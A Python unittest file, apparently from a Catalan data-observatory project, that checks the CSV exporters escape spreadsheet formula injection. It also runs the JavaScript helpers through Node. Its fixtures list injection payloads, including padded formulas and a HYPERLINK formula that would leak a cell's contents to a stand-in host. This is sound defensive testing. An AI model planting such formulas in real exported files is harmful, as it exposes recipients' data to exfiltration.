"""Exercise all CSV exporters against formulas without changing source data.

Run: python3 scripts/test_csv_security.py
The Node subprocess evaluates only the real CSV helpers from both entry points.
"""
import csv
import io
import json
from pathlib import Path
import subprocess
import tempfile
import unittest

from csv_safety import spreadsheet_cell, write_spreadsheet_csv
from build_observatori_catalog import normalize, write_outputs

ROOT = Path(__file__).resolve().parents[1]


def parse_csv(value):
    return list(csv.reader(io.StringIO(value.lstrip('\ufeff'), newline='')))


class CsvSecurityTests(unittest.TestCase):
    def test_python_and_browser_exporters(self):
        formulas = ['=1+1', '+SUM(1,2)', '@SUM(1,2)', '-1+2', '-2*3',
                    '-1E2+3', '-1,2+3', '-HYPERLINK("https://example.invalid",1)',
                    '-', '-1\n', '=HYPERLINK("https://example.invalid/?x="&A1,"link")']
        payloads = formulas + [padding + '=1+1' for padding in
                              [' ', '  ', '\t', '\r', '\n', '\x00', '\x1f',
                               '\x85', '\xa0', '\u2003', '\ufeff', ' \t ']]
        payloads += ['\tplain', '\rplain', '\nplain', ' \x00plain']
        safe = ['', None, 'plain', "'already text", 'A, B', 'quoted "label"',
                'line\nbreak', '18.4%', '-42', '-0.5', '-0,5', '-.5', '-,5',
                '-1.234,56', '-1,234.56', '-2e-3', '-20%',
                '-123456789012345678901234567890.12345678901234567890',
                0, -12, -1.25, 6.5]
        values = payloads + safe
        expected = ["'" + value for value in payloads]
        expected += ['' if value is None else str(value) for value in safe]
        self.assertEqual([str(spreadsheet_cell(v)) for v in values], expected)

        # A malicious column name must be encoded too, independently of values.
        fields = ['=column', 'titol', 'nota', 'etiqueta_fila', 'valor_text']
        rows = [{field: value for field in fields} for value in values]
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / 'fixture.csv'
            write_spreadsheet_csv(target, fields, rows)
            python_rows = parse_csv(target.read_bytes().decode('utf-8-sig'))
        self.assertEqual(python_rows[0], ["'=column"] + fields[1:])
        self.assertEqual(python_rows[1:], [[value] * len(fields) for value in expected])

        runner = r'''
const fs = require('node:fs');
const vm = require('node:vm');
const input = JSON.parse(fs.readFileSync(0, 'utf8'));
const outputs = [];
for (const [file, end, call] of [
  ['app.js', 'function exportaCSV(', 'csv(input.rows, input.fields)'],
  ['sociograma-revisado.html', 'function download(', 'csv(input.rows)']
]) {
  const source = fs.readFileSync(file, 'utf8');
  const start = source.indexOf('function csvSafeCell(');
  if (start < 0 || source.indexOf(end, start) < 0) throw Error('CSV helpers missing');
  const helpers = source.slice(start, source.indexOf(end, start));
  const context = {input};
  vm.runInNewContext(helpers + '\nresult = {cells: input.values.map(csvSafeCell), csv: ' + call + '};', context);
  outputs.push(context.result);
}
process.stdout.write(JSON.stringify(outputs));
'''
        completed = subprocess.run(['node', '-e', runner], cwd=ROOT, text=True,
                                   input=json.dumps(dict(values=values, rows=rows, fields=fields)),
                                   capture_output=True, check=True)
        for exported in json.loads(completed.stdout):
            self.assertEqual(exported['cells'], expected)
            self.assertEqual(parse_csv(exported['csv']), python_rows)

    def test_catalogue_zip_and_coverage_are_encoded_only_at_export(self):
        fiche = {
            'id': 'fixture', 'titol': '=1+1', 'categoria': 'demografia',
            'url': 'https://observatori.salt.cat/fixture/', 'consultat': '2026-10-24',
            'font': '\t=1+1', 'notes': ['@SUM(1,2)'],
            'variants': [{'ambit': '+SUM(1,2)', 'variant': 'Municipi',
                          'notes': ['-1+2'], 'tables': [{
                              'headers': [['label', '=1+1', '2025']],
                              'rows': [['=row', '=1+1', '-2.5']],
                              'format_numeric': 'decimal-punt'}]}]
        }
        before = json.dumps(fiche, ensure_ascii=False, sort_keys=True)
        catalog = normalize([fiche], [], expected=1)
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            write_outputs(catalog, root)
            text = (root / 'descarregues/observatori_dades_completes.csv').read_bytes().decode('utf-8-sig')
            rows = list(csv.DictReader(io.StringIO(text)))
            for field in ['titol', 'font', 'ambit', 'etiqueta_fila', 'nota_variant', 'nota_fitxa']:
                self.assertTrue(rows[0][field].startswith("'"), field)
            self.assertEqual(rows[0]['etiqueta_columna'], "'=1+1")
            self.assertEqual(rows[0]['valor_text'], "'=1+1")
            self.assertEqual(rows[0]['valor_num'], '')
            self.assertEqual(rows[1]['valor_text'], '-2.5')
            self.assertEqual(rows[1]['valor_num'], '-2.5')
            import zipfile
            with zipfile.ZipFile(root / 'descarregues/observatori_dades_completes.zip') as archive:
                self.assertEqual(archive.read('observatori_dades_completes.csv'),
                                 (root / 'descarregues/observatori_dades_completes.csv').read_bytes())
            with (root / 'descarregues/observatori_cobertura.csv').open(encoding='utf-8-sig', newline='') as stream:
                coverage = list(csv.DictReader(stream))
            self.assertEqual(coverage[0]['titol'], "'=1+1")
            self.assertEqual(coverage[0]['font'], "'\t=1+1")
            self.assertEqual(coverage[0]['notes'], "'@SUM(1,2)")
            saved = json.loads((root / 'data/observatori-cataleg.json').read_text())['fitxes'][0]
            self.assertEqual(saved['titol'], '=1+1')
            self.assertEqual(saved['variants'][0]['tables'][0]['rows'], [['=row', '=1+1', '-2.5']])
        # Normalization adds column metadata, but the original strings remain raw.
        original = json.loads(before)
        self.assertEqual(fiche['titol'], original['titol'])
        self.assertEqual(fiche['notes'], original['notes'])


if __name__ == '__main__':
    unittest.main(verbosity=2)
